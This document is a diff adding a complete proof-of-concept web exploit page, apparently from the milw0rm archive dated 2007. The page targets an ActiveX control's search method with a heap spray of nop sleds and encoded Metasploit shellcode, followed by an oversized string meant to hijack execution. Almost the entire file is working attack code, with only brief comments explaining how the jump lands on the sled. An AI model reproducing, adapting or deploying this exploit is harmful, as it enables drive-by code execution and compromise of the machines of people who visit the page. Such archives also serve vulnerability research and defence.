@@ -1,0 +1,37 @@
+<HTML>
+<TITLE>In God We Trust, VDA Labs, LLC</TITLE>
+<HEAD>
+<object classid='clsid:0F2437D6-C4E4-42CA-A906-F506E09354B7' id='target'></object>
+<script language='javascript'>  
+
+   function repeat(n,c)
+   {
+	retval="";
+	for (i=0;i<n;i++)
+	 retval = retval + c;
+	return retval
+   }
+
+   //EAX contains this value.  call [eax].  that lands us on the nops.
+   blind_jmp = repeat(50000,unescape("%u0a0a%u0a0a"));  
+
+   //shellcode:  From metasploit.com. SC can be very big if you want.
+   shellcode = unescape("%uc931%ue983%ud9dd%ud9ee%u2474%u5bf4%u7381%ub213%u28cd%u837b%ufceb%uf4e2%u254e%u7b6c%ucdb2%u3ea3%u468e%u7e54%uccca%uf0c7%ud5fd%u24a3%ucc92%u32c3%uf939%u7aa3%ufc5c%ue2e8%u491e%u0fe8%u0cb5%u76e2%u0fb3%u8fc3%u9989%u7f0c%u28c7%u24a3%ucc96%u1dc3%uc139%uf063%ud1ed%u9029%ud139%u7aa3%u4459%u5f74%u0eb6%ubb19%u46d6%u4b68%u0d37%u7750%u8d39%uf024%ud1c2%uf085%uc5da%u72c3%u4d39%u7b98%ucdb2%u13a3%u928e%u8d19%u9bd2%u83a1%u0d31%u2b53%ub3da%u99f0%ua5c1%u85b0%uc338%u847f%uae55%u1749%ue3d1%u034d%ucdd7%u7b28");
+
+   //changed to point to 0x0a0a0a0a
+   nops = repeat(3925, unescape("%u0a0a%u0a0a") ); //jmp +0, push eax, pop eax
+   
+   mem = new Array();
+   for(i=0; i<9000; i++)
+   {
+	mem[i] = nops+shellcode;
+   }
+
+   //make string
+   target.search("jared", blind_jmp);
+
+</script>
+</body>
+</html>
+
+# milw0rm.com [2007-07-24]
